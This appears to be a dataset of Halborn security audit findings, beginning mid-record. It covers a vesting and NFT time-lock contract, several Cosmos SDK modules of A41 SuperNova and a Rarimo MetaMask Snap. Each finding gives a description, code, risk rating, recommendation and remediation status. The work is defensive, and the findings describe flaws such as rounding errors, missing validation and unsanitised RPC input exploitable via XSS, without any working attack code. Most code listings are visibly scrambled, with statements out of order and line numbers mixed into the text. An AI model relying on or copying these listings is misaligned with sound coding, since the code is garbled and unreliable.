contracts/Token/CvgERC721TimeLocking.sol (Line 63) require ( timestamp > block . timestamp && timestamp - block . 62 function setLock ( uint256 tokenId , uint256 timestamp ) external  onlyNftOwner ( tokenId ) { 63  timestamp < maxLockingTime , \" WRONG_TIME_LOCK \" ); 64 65 } unlockingTimestampPerToken [ tokenId ] = timestamp ; 32 BVSS: AO:A/AC:L/AX:H/C:N/I:N/A:N/D:N/Y:C/R:N/S:U (3.3) Recommendation: Implement a buffer where the new timestamp cannot be earlier than a few minutes from the block timestamp. Remediation Plan: SOLVED: The Convergence Finance team fixed this issue by adding a buffer when changing the lock timestamp in commit 20414f9. 33 ", "labels": ["Halborn", "Convergence_Finance_Convergence_Protocol", "Severity: Low"]}, {"title": "ROUNDING ERROR WHEN COMPUTING RELEASABLE AMOUNT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The calculateRelease function in the VestingCVG contract is in charge of computing the releasable amount on each slice of the vesting schedule. However, there is a small rounding error in the calculation of the release amount for each slice. This results in slices releasing fewer tokens than what they should. Code Location: Listing 7: contracts/PresaleVesting/VestingCvg.sol (Lines 392-405) uint256 vestingSchedulesId , uint256 totalAmount , uint256 totalAmountReleased 378 function calculateRelease ( 379 380 381 382 ) private view returns ( uint256 amountToRelease ) { 383 384 385 uint256 amountReleasable ; uint256 slices = vestingSchedules [ vestingSchedulesId ]. slices ; uint256 slicePeriod = vestingSchedules [ vestingSchedulesId ].  slicePeriods ; 386 uint256 releaseTimestamp = vestingSchedules [ vestingSchedulesId  ]. cliff ; 387 uint256 dropCliff = vestingSchedules [ vestingSchedulesId ].  dropCliff ; 388 389 390 391 392 393 uint256 amountDropCliff = ( totalAmount * dropCliff ) / 1000; uint256 endRelease = releaseTimestamp + slices * slicePeriod ; if ( block . timestamp >= releaseTimestamp ) { uint256 actualSlice = ( block . timestamp - releaseTimestamp )  / ( slicePeriod ); 394 395 if ( slices <= actualSlice ) { 34 396 397 398 amountReleasable = totalAmount ; } else { uint256 a = ( totalAmount - amountDropCliff ) / (  endRelease - releaseTimestamp ); 399 int256 b = int256 ( amountDropCliff ) - int256 ( a *  releaseTimestamp ); 400 uint256 x = releaseTimestamp + actualSlice *  slicePeriod ; amountReleasable = uint256 ( int256 ( a) * int256 (x ) + b); } amountToRelease = amountReleasable - totalAmountReleased ; } 401 402 403 404 405 406 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:L/R:N/S:U (2.5) Recommendation: Please see below for an optimized formula that simplifies the calcula- tions, achieving the same result without rounding errors: Listing 8: contracts/PresaleVesting/VestingCvg.sol (Lines 392-402) uint256 vestingSchedulesId , uint256 totalAmount , uint256 totalAmountReleased 378 function calculateRelease ( 379 380 381 382 ) private view returns ( uint256 amountToRelease ) { 383 384 385 uint256 amountReleasable ; uint256 slices = vestingSchedules [ vestingSchedulesId ]. slices ; uint256 slicePeriod = vestingSchedules [ vestingSchedulesId ].  slicePeriods ; 386 uint256 releaseTimestamp = vestingSchedules [ vestingSchedulesId  ]. cliff ; 387 uint256 dropCliff = vestingSchedules [ vestingSchedulesId ].  dropCliff ; 388 389 uint256 amountDropCliff = ( totalAmount * dropCliff ) / 1000; 35 390 391 392 393  / 394 395 396 397 398 399 uint256 endRelease = releaseTimestamp + slices * slicePeriod ; if ( block . timestamp >= releaseTimestamp ) { uint256 actualSlice = ( block . timestamp - releaseTimestamp ) ( slicePeriod ); if ( slices <= actualSlice ) { amountReleasable = totalAmount ; } else { amountReleasable = amountDropCliff + (( totalAmount -  amountDropCliff ) * actualSlice ) / slices ; } amountToRelease = amountReleasable - totalAmountReleased ; 400 401 402 403 } } Remediation Plan: SOLVED: The Convergence Finance team fixed the issue by switching to a different non-slice based model in commit 46799c7. 36 ", "labels": ["Halborn", "Convergence_Finance_Convergence_Protocol", "Severity: Low"]}, {"title": "VESTING SCHEDULES WITH AN AMOUNT LOWER THAN MAXIMUM SUPPLY REVERT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "When releasing CVG for the team or DAO schedule, the CVG is computed based on the max supply instead of the total amount specified in the schedule. Therefore, specifying any amount below the max supply when creating the schedule results in users unable to release due to underflow. The vesting schedules are set by the contracts owner. Code Location: Listing 9: contracts/PresaleVesting/VestingCvg.sol (Lines 325,329) internal view returns ( uint256 amountToRelease , uint256 _vestingScheduleId ) bool _isTeam uint256 vestingType ; uint256 totalAmount ; uint256 totalAmountReleased ; 311 function _computeReleaseAmountTeamDao ( 312 313 ) 314 315 316 317 { 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 if ( _isTeam ) { } else { } totalAmountReleased = amountReleasedTeam ; vestingType = TYPE_TEAM ; totalAmount = MAX_SUPPLY_TEAM ; totalAmountReleased = amountReleasedDao ; vestingType = TYPE_DAO ; totalAmount = MAX_SUPPLY_DAO ; _vestingScheduleId = vestingIdForType [ vestingType ]; amountToRelease = calculateRelease ( 37 _vestingScheduleId , totalAmount , totalAmountReleased ); 334 335 336 337 338 } BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:C/D:N/Y:N/R:N/S:U (2.0) Recommendation: Use the total amount specified when creating the vesting schedule, or implement a check to prevent a vesting schedule for the team or the DAO with a total amount below max supply from being created. Remediation Plan: SOLVED: The Convergence Finance team fixed the issue by allowing to create vesting schedules for the team or DAO with the max amount only in commit 20414f9. 38 RETESTING 39 The issue described in this section was brought to Halborns attention by the Convergence Finance team during the engagement. 5.1 CONVERGENCE01 - USER CAN SEND ALLOWANCE EXCESS TO THE CVGUTILITIES CONTRACT ", "labels": ["Halborn", "Convergence_Finance_Convergence_Protocol", "Severity: Low"]}, {"title": "FUNDS CAN BE LOCKED IF THE ZONE DECIMAL IS HIGHER THAN 18", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "During the code review, It has been noticed that zone decimal does not have upper bound. Zone decimal can be added with more than 18 decimals. On the ClaimSnMesssage, ClaimShareToken is used when user want to claim their share token. However, If the zone decimal is higher than 18, the following equation will fail and assets could not claim from the system. The oracle address directly can break system through decimal. Code Location: /x/gal/keeper/claim.go, Lines 167 Listing 1 convertDecimal := snAssetDecimal - decimal asset := new ( big . Int ). Mul ( amount , precisionMultiplier (0) ) snAsset := new ( big . Int ). Quo ( asset , precisionMultiplier ( 1 func ( k Keeper ) ConvertWAssetToSnAssetDecimal ( amount * big . Int ,  decimal int64 , denom string ) sdk . Coin { 2 3 4  convertDecimal )) 5 6 } 7 return sdk . NewCoin ( denom , sdk . NewIntFromBigInt ( snAsset )) 21 Proof Of Concept: Scenario:  Register/Change zone with more than 18 decimals.  Even if Its privileged function by the controller, GAL module will lead to chain halt due to above equation. Listing 2 transferPort transferChannel = \" channel -0 \" icaConnection = \" transfer \" = \" connection -1 \" zoneId baseOwnerAcc = sdk . AccAddress ( secp256k1 . GenPrivKey () . = \" baseZone \" 1 var ( 2 3 4 5 6 7  PubKey () . Address () ) 8 9 10 11 ) baseDenom baseSnDenom baseDecimal = \" stake \" = \" snstake \" = int64 (19) 22 Risk Level: Likelihood - 5 Impact - 5 Recommendation: On the ICAControl module, ensure that zone decimal is not higher than 18. Remediation Plan: SOLVED: The A41 team solved the issue in commit 08edd624 by adding the decimal check. 23 ", "labels": ["Halborn", "A41_SuperNova_Cosmos", "Severity: Critical"]}, {"title": "UNIQUENESS OF ZONES ARE NOT VALIDATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "Uniqueness of denom is checked with zone ID on the Registered zones. BaseDenom should be unique for each zone. Even if Its controller privi- leged function. One wrong value set on the denom will be resulted with the funds lost. We recommend ensuring that both BaseDenom is unique throughout all host zones before allowing them to be set in the Regis- terZone. Code Location: /x/icacontrol/keeper/msg_server.go, Lines 99 Listing 3 } if ! k . IsValidControllerAddr ( ctx , zone . ZoneId , zone . IcaAccount . ctx := sdk . UnwrapSDKContext ( goCtx ) return nil , sdkerrors . Wrap ( sdkerrors . ErrInvalidAddress , 1 func ( k msgServer ) ChangeRegisteredZone ( goCtx context . Context ,  zone * types . MsgChangeRegisteredZone ) (* types .  MsgChangeRegisteredZoneResponse , error ) { 2 3 4  ControllerAddress ) { 5  zone . IcaAccount . ControllerAddress ) 6 7 8 9 10 11 12 13 14 15 16 17 18 ZoneId : zone . ZoneId , IcaConnectionInfo : & types . IcaConnectionInfo { ConnectionId : zone . IcaInfo . ConnectionId , PortId : }, TransferInfo : & types . TransferConnectionInfo { }, IcaAccount : & types . IcaAccount { ControllerAddress : zone . IcaAccount . ControllerAddress , HostAddress : zoneInfo := & types . RegisteredZone { zone . IcaAccount . HostAddress , zone . IcaInfo . PortId , 24 PortId : ChannelId : zone . TransferInfo . ChannelId , zone . TransferInfo . PortId , }, ValidatorAddress : zone . ValidatorAddress , BaseDenom : SnDenom : zone . BaseDenom , appendSnPrefix ( types . PrefixSnAsset , zone Decimal : MaxEntries : zone . Decimal , zone . MaxEntries , k. Keeper . RegisterZone ( ctx , zoneInfo ) return & types . MsgChangeRegisteredZoneResponse { zoneInfo . ZoneId , zoneInfo . IcaConnectionInfo , zoneInfo . TransferInfo , ZoneId : IcaInfo : TransferInfo : ValidatorAddress : zoneInfo . ValidatorAddress , BaseDenom : SnDenom : Decimal : MaxEntries : zoneInfo . BaseDenom , zoneInfo . BaseDenom , zoneInfo . Decimal , zoneInfo . MaxEntries , } 19 20 21 22 23 24  . BaseDenom ) , 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 } 41 }, nil 25 Proof Of Concept: Risk Level: Likelihood - 4 Impact - 4 Recommendation: Ensure that all zones are unique and compared with existing zones. Remediation Plan: SOLVED: The A41 team solved the issue in commit b6041991 by adding the validation in the zones. 26 ", "labels": ["Halborn", "A41_SuperNova_Cosmos", "Severity: High"]}, {"title": "MISSING VALIDATION LEADS TO LOST OF FUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "On the minting module, at the beginning of block, every time tokens are minted depends on the staking amount. However, If the pool does not exist or contract address is typed wrongly. Minting module can panic, and the chain can halt. On the PoolIncentive module, Pool Contract address is not verified If the distribution operation fails than directly chain will halt with this check. Code Location: /x/mint/keeper/keeper.go, Lines 175 Listing 4 } return nil lpIncentiveCoin := k. bankKeeper . GetBalance ( ctx , moduleAddr , pools := k . PoolIncentiveKeeper . GetAllIncentivePool ( ctx ) if len ( pools ) == 0 { totalWeight := k . PoolIncentiveKeeper . GetTotalWeight ( ctx ) moduleAddr := k. accountKeeper . GetModuleAddress ( types . 1 func ( k Keeper ) distributeLPIncentivePools ( ctx sdk . Context , denom  string ) error { 2 3 4 5 6 7 8  LpIncentiveModuleAccName ) 9  denom ) 10 11 12  Quo ( sdk . NewIntFromUint64 ( totalWeight ). ToDec () ) 13  ( poolWeight ) 14  lpIncentiveCoin . Denom , incentive . TruncateInt () )) 15  PoolContractAddress ) poolWeight := sdk . NewIntFromUint64 ( pool . Weight ). ToDec () . poolAddr , err := sdk . AccAddressFromBech32 ( pool . incentivesCoins := sdk . NewCoins ( sdk . NewCoin ( for _ , pool := range pools { incentive := sdk . NewDecFromInt ( lpIncentiveCoin . Amount ). Mul 27 err = k . bankKeeper . SendCoinsFromModuleToAccount ( ctx , types } return err if err != nil { 16 17 18 19 20  . LpIncentiveModuleAccName , poolAddr , incentivesCoins ) 21 22 23 24 25 26 } } return nil if err != nil { return err } Proof Of Concept: Listing 5 { }{ \" valid case \" , tcs := [] struct { name preset pool shouldErr bool string [] types . IncentivePool types . IncentivePool name : preset : [] types . IncentivePool {} , pool : types . IncentivePool { 1 func ( suite * KeeperTestSuite ) TestCreateIncentivePool () { 2 3 4 5 6 7 8 9 10 11 12  poolincentive -1 \" , 13 14 15 16 17 18 19 20 21 22 23 24 } keeper := suite . App . PoolKeeper // setup for i := range tc . preset { }, shouldErr : false , suite . Run ( tc . name , func () { for _ , tc := range tcs { PoolId : }, \" PoolContractAddress : \" 12345 \" , Weight : 0, 28 err := keeper . CreateIncentivePool ( err := keeper . CreateIncentivePool ( suite . } } else { suite . Error ( err ) if tc . shouldErr { suite . NoError ( err ) 25  suite . Ctx , & tc . preset [ i ]) 26 27 28 29  Ctx , & tc . pool ) 30 31 32 33 34 35  FindIncentivePoolById ( suite . Ctx , tc . pool . PoolId ) 36 37  incentivePool . PoolId ) 38  PoolContractAddress , incentivePool . PoolContractAddress ) 39  incentivePool . Weight ) 40 41 42 43 } suite . Equal ( tc . pool . suite . NoError ( err ) }) } } incentivePool , err := keeper . suite . NoError ( err ) suite . Equal ( tc . pool . PoolId , suite . Equal ( tc . pool . Weight , Risk Level: Likelihood - 4 Impact - 4 Recommendation: Ensure that pool address is validated in the ValidateBasic function. ValidateBasic is happening during the CheckTx phase, and it doesnt have access to the state. In the current implementation, only signer is validated on the ValidateBasic function. 29 Remediation Plan: SOLVED: The A41 team solved the issue in commit 538abc771 by adding the pool contract address validation. 30 ", "labels": ["Halborn", "A41_SuperNova_Cosmos", "Severity: High"]}, {"title": "NON", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "In several instances of the codebase, iterations are done over maps. Since Go map iterations are non-deterministic, this would cause each validator to produce a different app hash, causing a consensus failure and potentially leading to a chain halt. Code Location: Listing 6 1 x / gal / keeper / grpc_query . go :111 2 x / gal / keeper / withdraw . go :78 3 x / gal / keeper / withdraw . go :135 4 x / gal / keeper / withdraw . go :156 5 x / gal / keeper / withdraw . go :170 6 x / gal / keeper / withdraw . go :186 7 x / gal / keeper / withdraw . go :221 8 app / app . go :373 9 app / app . go :451 10 x / airdrop / keeper / user_state . go :71 Risk Level: Likelihood - 3 Impact - 5 Recommendation: We recommend sorting the map keys into a slice and iterating over the sorted keys to ensure deterministic results among all validators. 31 Remediation Plan: SOLVED: The A41 team solved the issue in commit 0584f524 by adding With this option, Marshaler the stable_marshaler into the protobuf. output is guaranteed to be deterministic. 32 ", "labels": ["Halborn", "A41_SuperNova_Cosmos", "Severity: High"]}, {"title": "BLOCK HEIGHT IS NOT CHECKED WHEN UPDATING STATE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "The oracle module manages the status of the zones associated with the Supernova protocol. The status includes the amount of coins delegated to the Zones Validator, block height, proof, and so on. This information is injected by the bot at a short interval. For the integrity of the information, the AppHash and block height are provided together. During the code review, It has been observed block height is not checked when updating oracle state. Code Location: /x/oracle/keeper/msg_server.go, Lines 32 Listing 7 } return nil , types . ErrInvalidOperator ctx := sdk . UnwrapSDKContext ( goctx ) if ! server . keeper . IsValidOracleAddress ( ctx , state . ZoneId , 1 func ( server msgServer ) UpdateChainState ( goctx context . Context ,  state * types . MsgUpdateChainState ) (* types .  MsgUpdateChainStateResponse , error ) { 2 3  state . Operator ) { 4 5 6 7 8 9 10 11 12 13 14 15  ZoneId ) Coin : OperatorAddress : state . Operator , LastBlockHeight : state . BlockHeight , AppHash : ZoneId : newOracleState := & types . ChainInfo { state . AppHash , state . ZoneId , state . Coin , } oracleVersion , _ := server . keeper . GetOracleVersion ( ctx , state . 33 16 17 18 19 20 21 22 23  err != nil { 24  err ) 25 26 27  err != nil { 28  err ) 29 30 31 32 } } } trace := types . IBCTrace { Version : oracleVersion + 1, Height : uint64 ( ctx . BlockHeight () ) , } server . keeper . SetOracleVersion ( ctx , state . ZoneId , trace ) if err := server . keeper . UpdateChainState ( ctx , newOracleState ); return nil , sdkerrors . Wrapf ( types . ErrUnknown , \" err : %v \" , if err := ctx . EventManager () . EmitTypedEvent ( newOracleState ); return nil , sdkerrors . Wrapf ( types . ErrUnknown , \" err : %v \" , return & types . MsgUpdateChainStateResponse {} , nil Proof Of Concept: 34 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider using latest Block height from the context. Remediation Plan: SOLVED: The A41 team solved the issue in commit e938023 by adding the block height check. 35 ", "labels": ["Halborn", "A41_SuperNova_Cosmos", "Severity: Medium"]}, {"title": "DUPLICATED ZONE LIST IS NOT REMOVED DURING THE GENESIS INITIALIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "In /x/icacontrol/keeper/genesis.go, the icacontrol genesis validate func- tionality does not remove duplicates from the zone list slice. As the RegisterZone keeper function in /x/icacontrol/keeper/zone.go#L15 uses the zone ID as the key identifier, having duplicate chain ID values in the RegisterZone slice would cause the final index with the same chain ID value to be stored in the storage. As a result, previous zone configu- rations with duplicate zone ID values would be overwritten and ignored completely. Code Location: /x/icacontrol/keeper/msg_server.go, Lines 99 Listing 8 k. SetParams ( ctx , genState . Params ) k . SetControllerAddr ( ctx , controllerInfo . ZoneId , for _ , controllerInfo := range genState . ControllerAddressInfo 1 func ( k Keeper ) InitGenesis ( ctx sdk . Context , genState * types .  GenesisState ) { 2 3 4  { 5  controllerInfo . ControllerAddress ) 6 7 } 8 9 func ( k Keeper ) ExportGenesis ( ctx sdk . Context ) * types . GenesisState  { 10 11 12 } params := k . GetParams ( ctx ) return types . NewGenesisState ( params ) } 36 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Add need validation mechanisms in genesis. Remediation Plan: RISK ACCEPTED: The A41 team accepted the risk of issue. They will fix it in a future release. 37 ", "labels": ["Halborn", "A41_SuperNova_Cosmos", "Severity: Medium"]}, {"title": "MISSING VALIDATION ON THE HOST DENOM AND IBC DENOM", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "ValidateDenom is the default validation function for Host.Denom. In the The system should parameters, Denom is only checked with the length. verify all parameters, even if the controller manages them. Code Location: /x/icacontrol/types/msgs.go, Lines 50 Listing 9 return sdkerrors . Wrapf ( ErrZoneIdNotNil , \" zoneId is not nil if strings . TrimSpace ( msg . IcaInfo . ConnectionId ) == \"\" { return errors . New ( \" missing ICA connection ID \" ) _ , err := sdk . AccAddressFromBech32 ( msg . IcaAccount . } } 1 func ( msg MsgRegisterZone ) ValidateBasic () error { 2 if strings . TrimSpace ( msg . ZoneId ) == \"\" { 3  \" ) 4 5 6 7 8 9 10  ControllerAddress ) 11 12  Invalid controller address \") 13 14 15 16 17 18 19 20 if strings . TrimSpace ( msg . BaseDenom ) == \"\" { return errors . New ( \" missing denom \") if err != nil { } } if strings . TrimSpace ( msg . ValidatorAddress ) == \" \" { return errors . New ( \" missing validator address \" ) return sdkerrors . Wrapf ( sdkerrors . ErrInvalidAddress , \" 38 } if msg . MaxEntries == 0 { return errors . New ( \" cannot set max_entries to zero \") } return nil 21 22 23 24 25 26 27 28 } 29 Proof Of Concept: Listing 10 novatesting \" github . com / Carina - labs / nova / testing \" icacontroltypes \" github . com / Carina - labs / nova / x / icacontrol / \" github . com / cosmos / cosmos - sdk / crypto / keys / secp256k1 \" sdk \" github . com / cosmos / cosmos - sdk / types \" icatypes \" github . com / cosmos / ibc - go / v3 / modules / apps /27 - ibcchanneltypes \" github . com / cosmos / ibc - go / v3 / modules / core 1 package keeper_test 2 3 import ( 4 5  types \" 6 7 8  interchain - accounts / types \" 9  /04 - channel / types \" 10 ) 11 12 var ( 13 14 15 16 17 18  PubKey () . Address () ) 19 20 21 22 ) baseDenom baseSnDenom baseDecimal = \" NOVA \" = \" snNOVA \" = int64 (19) transferPort transferChannel = \" channel -0 \" icaConnection = \" transfer \" = \" connection -1 \" zoneId baseOwnerAcc = sdk . AccAddress ( secp256k1 . GenPrivKey () . = \" baseZone \" 39 Risk Level: Likelihood - 3 Impact - 4 Recommendation: It is recommended to use ValidateDenom with ValidateIBCDenom in the related sections. On the other hand, it is recommended to verify the connection through IBC. Remediation Plan: SOLVED: The A41 team solved the issue in commit 284db08a by adding val- idations. 40 ", "labels": ["Halborn", "A41_SuperNova_Cosmos", "Severity: Medium"]}, {"title": "MISSING FUNCTIONALITY WHEN CONNECTION IS CLOSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "When the IBC channel connection was closed, the GAL module was unable to handle the workflow over the connection. Code Location: /x/icacontrol/ibc_mobule.go, Lines 109 Listing 11 ctx sdk . Context , portID , channelID string , 1 func ( im IBCModule ) OnChanCloseConfirm ( 2 3 4 5 ) error { 6 7 } 8 return nil Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to handle the connection when it is closed and confirmed. Remediation Plan: RISK ACCEPTED: The A41 team accepted the risk of this issue. They will fix it in a future release. 41 ", "labels": ["Halborn", "A41_SuperNova_Cosmos", "Severity: Medium"]}, {"title": "ORACLE STATE IS GENERATED INSTEAD OF UPDATE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf", "body": "The status of the zones connected to the Supernova protocol is managed by the Oracle module. The status contains information such as block height, proof, block size, and the number of coins assigned to the zone validator. However, when the state is updated, a new state is added instead of an update. The implementation does not check the uniqueness of the zone ID. Code Location: /x/oracle/keeper/msg_server.go#L23 Listing 12 } newOracleState := & types . ChainInfo { return nil , types . ErrInvalidOperator ctx := sdk . UnwrapSDKContext ( goctx ) if ! server . keeper . IsValidOracleAddress ( ctx , state . ZoneId , 1 func ( server msgServer ) UpdateChainState ( goctx context . Context ,  state * types . MsgUpdateChainState ) (* types .  MsgUpdateChainStateResponse , error ) { 2 3  state . Operator ) { 4 5 6 7 8 9 10 11 12 13 14 15  ZoneId ) 16 17 Coin : OperatorAddress : state . Operator , LastBlockHeight : state . BlockHeight , AppHash : ZoneId : state . AppHash , state . ZoneId , trace := types . IBCTrace { state . Coin , } oracleVersion , _ := server . keeper . GetOracleVersion ( ctx , state . 42 Version : oracleVersion + 1, Height : uint64 ( ctx . BlockHeight () ) , } server . keeper . SetOracleVersion ( ctx , state . ZoneId , trace ) if err := server . keeper . UpdateChainState ( ctx , newOracleState ); return nil , sdkerrors . Wrapf ( types . ErrUnknown , \" err : %v \" , if err := ctx . EventManager () . EmitTypedEvent ( newOracleState ); return nil , sdkerrors . Wrapf ( types . ErrUnknown , \" err : %v \" , return & types . MsgUpdateChainStateResponse {} , nil 18 19 20 21 22 23  err != nil { 24  err ) 25 26 27  err != nil { 28  err ) 29 30 31 32 } } } Risk Level: Likelihood - 3 Impact - 3 43 Proof Of Concept: Recommendation: Consider updating the state instead of generating a new state. Remediation Plan: SOLVED: The A41 team solved the issue in commit bca885ebda by adding zone validation. 44 3.10 (HAL-10) NON-DETERMINISTIC SYSTEM TIME - MEDIUM ", "labels": ["Halborn", "A41_SuperNova_Cosmos", "Severity: Informational"]}, {"title": "POTENTIAL SAVE OF ARBITRARY CREDENTIALS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Rarimo_Snap_App_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "The lack of proper input sanitization can lead to several security vul- nerabilities in a software system. An attacker could exploit unsanitized inputs to inject malicious code or commands, potentially leading to unauthorized data access, modification, or deletion; circumvention of security measures; arbitrary code execution; and overall system compro- mise. Details: During the assessment, it was discovered that the exposed RPC endpoint save_credentials is not checking or sanitizing the data received: Listing 1 1 const offer = request . params as any as ClaimOffer ; This data is later used in the rest of the code of the RPC: Listing 2 return acc . concat ([ divider () , text ( cred . description ) , text ( ( acc : any , cred : any ) => { 1 const dialogCredentials = offer . body . credentials . reduce ( 2 3  cred . id ) ]) ; }, 4 5 [] , 6 ); 7 8 const res = await snap . request ({ method : ' snap_dialog ' , 9 10 params : { 11 12 13 }, type : ' confirmation ' , content : panel ([... dialogContent , ... dialogCredentials ]) , 11 14 }) ; 15 16 if ( res ) { 17  privateKeyHex ); 18 19  ; 20 21 22 } const identity = await Identity . create ( identityStorage . const authProof = new AuthZkp ( identity , offer ); const credentials = await authProof . getVerifiableCredentials () await saveCredentials ( credentials ); return credentials ; An attacker with access to execute JS code in the context of a page authorized to contact this Snap App (for example via a Cross-Site Scripting vulnerability) could invoke this endpoint and send arbitrary credentials, partially controlling the flow that uses this data, and finally storing arbitrary credentials. Risk Level: Likelihood - 3 Impact - 3 CVSS Vector:  CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L Recommendation: It is recommended to check that each value in the parameters received contains the expected format and that it was legitimately sent by the user. Note that the criticality of this vulnerability was reduced because it requires user interaction. However, note how the attacker would be controlling the offer.from string parameter and other string parameters used to ask the user to allow saving the credentials. 12 Another specially sensitive parameter the attacker could control is url. As the parameters sent by the potential attacker are going to be stored in an object of type ClaimOffer, it is recommended to check each of the fields of this object with regexes to ensure their format (and potentially compare the URL with a list of allowed domains to use): Listing 3 description : string ; id : string ; { }, body : { credentials : [ ]; url : string ; 1 export type ClaimOffer = { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 }; }; from : string ; id : string ; thid ?: string ; to : string ; typ ?: string ; type : string ; Another option to consider fixing this issue would be to add all the logic the client JavaScript is executing (the create_identity call and the fetch request) before calling save_credentials to the save_credentials code, so the potential attacker will not be able to send any data. Remediation Plan: SOLVED: The function isValidSaveCredentialsOfferRequest was added to val- idate the offer before using it. 13 ", "labels": ["Halborn", "Rarimo_Snap_App_WebApp_Pentest", "Severity: Medium"]}, {"title": "POTENTIAL GENERATION OF ARBITRARY PROOFS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Rarimo_Snap_App_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "Similar to the previous issue, this vulnerability is related to the lack of sanitization of the received parameters that allows a potential attacker with access to communicate with the Snap App to try to create proofs Details: In this case, it was observed that a potential attacker could abuse, for example, a XSS vulnerability to generate an arbitrary proof. This is because the attacker would be in complete control of the parameters used to create the proof because there is no input sanitization. The parameters are loaded in the line: Listing 4 1 const params = request . params as any as CreateProofRequest ; And later used to generate the proof without any checking or sanitization: Listing 5 ( cred ) => cred . credentialSubject . id === identityStorage . did , 1 const credentials = ( await findCredentialsByQuery ( params . query )) .  filter ( 2 3 ); 4 5 if (! credentials . length ) { 6 throw new Error ( 7  . did }` , 8 9 } `no credential were issued on the given id ${ identityStorage ); 14 ? [ divider () , text ( ' Credential type ') , text ( ? [ ...( credentialSubject type : ' confirmation ' , content : panel ([ heading (' Create proof ') , ...( credentialType 10 11 const credentialType = params . query . type ; 12 const { credentialSubject } = params . query ; 13 const { circuitId } = params ; 14 15 const res = await snap . request ({ method : ' snap_dialog ' , 16 params : { 17 18 19 20 21 22  credentialType )] : []) , 23 24 25 26 27 28 29 30  fieldName ]; 31  map ( 32 33 34  fieldOperators [ operator ]}\\ n ` , 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 }) ; ( operator ) => { return text ( ] : []) , ...( circuitId }, [] , ]) , ) , ); }, }, ); return acc . concat ( textField ); divider () , text (' Requirements ') , ... Object . keys ( credentialSubject ). reduce ( ( acc : TextField [] , fieldName ) => { const fieldOperators = credentialSubject ?.[ const textField = Object . keys ( fieldOperators ). `$ { fieldName } - ${ operator } $ { ? [ divider () , text ( ' Proof type ') , text ( circuitId )] : []) , 15 50 51 if ( res ) { 52  privateKeyHex ); 53 54 55 } const identity = await Identity . create ( identityStorage . const zkpGen = new ZkpGen ( identity , params , credentials [0]) ; return await zkpGen . generateProof () ; Risk Level: Likelihood - 3 Impact - 3 CVSS Vector:  CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L Recommendation: It is recommended to check that each value in the parameters received contains the expected format and that it was legitimately sent by the user. Note that the criticality of this vulnerability was reduced because it requires user interaction. However, note how the attacker would be controlling the parameters used to ask the user to allow generating the proof. As the parameters sent by the potential attacker are going to be stored in an object of type CreateProofRequest, it is recommended to check each of the fields of this object with regexes to ensure their format and that the content is not malicious. 16 Remediation Plan: SOLVED: The function isValidCreateProofRequest was added to validate the params before using it. 17 ", "labels": ["Halborn", "Rarimo_Snap_App_WebApp_Pentest", "Severity: Medium"]}, {"title": "DEPENDENCIES SHOULD BE PINNED TO EXACT VERSIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Rarimo_Snap_App_WebApp_Pentest_Report_Halborn_Final.pdf", "body": "The application contains some external dependencies, some of which are not pinned to an exact version but set to a compatible version (x.x.x). This can potentially enable dependency attacks, as observed with the event-stream package with the Copay Bitcoin Wallet. Details: Main package.json: Listing 6 1 \" devDependencies \": { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 } \" @metamask / eslint - config \": \"^10.0.0\" , \" @metamask / eslint - config - jest \": \"^10.0.0\" , \" @metamask / eslint - config - nodejs \": \"^10.0.0\" , \" @metamask / eslint - config - typescript \": \"^10.0.0\" , \" @typescript - eslint / eslint - plugin \": \"^5.33.0\" , \" @typescript - eslint / parser \": \"^5.33.0\" , \" eslint \": \"^8.21.0\" , \" eslint - config - prettier \": \"^8.1.0\" , \" eslint - plugin - import \": \"^2.26.0\" , \" eslint - plugin - jest \": \"^26.8.2\" , \" eslint - plugin - jsdoc \": \"^39.2.9\" , \" 